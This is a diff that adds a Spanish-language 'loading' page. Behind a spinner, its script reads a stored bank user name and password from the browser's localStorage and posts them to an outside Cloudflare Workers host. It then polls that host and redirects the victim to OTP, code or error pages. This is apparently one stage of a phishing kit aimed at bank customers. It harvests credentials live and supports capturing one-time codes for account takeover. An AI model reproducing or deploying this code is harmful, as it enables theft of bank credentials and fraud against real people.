@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cargando...</title>
+  <style>
+    body {
+      background: #0d1b2a;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .spinner {
+      border: 6px solid rgba(255, 255, 255, 0.1);
+      border-left-color: #00b4d8;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .text {
+      font-size: 1.2rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <div class="text">Cargando, por favor espera...</div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', async function () {
+      const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+      if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) return;
+
+      const usuario = bancoldata.usuario;
+      const clave = bancoldata.clave;
+      const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+      localStorage.setItem('transactionId', transactionId);
+
+      try {
+        await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usuario, clave, transactionId })
+        });
+      } catch (e) {
+        console.error("Error al conectar al Worker:", e);
+      }
+
+      const checkStatus = async () => {
+        try {
+          const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${transactionId}`);
+          const data = await res.json();
+
+          if (data.autorizado && !data.error) window.location.href = "codigo.html";
+          else if (data.error && !data.finalizado && !data.otpSolicitado) window.location.href = "usererror.html";
+          else if (data.otpSolicitado) window.location.href = "otp.html";
+          else if (data.error && data.fallo) window.location.href = "fallo.html";
+          else if (data.finalizado) window.location.href = "finalizar.html";
+          else setTimeout(checkStatus, 2000);
+        } catch (err) {
+          console.error("Error en polling:", err);
+          setTimeout(checkStatus, 2000);
+        }
+      };
+
+      checkStatus();
+    });
+  </script>
+</body>
+</html>
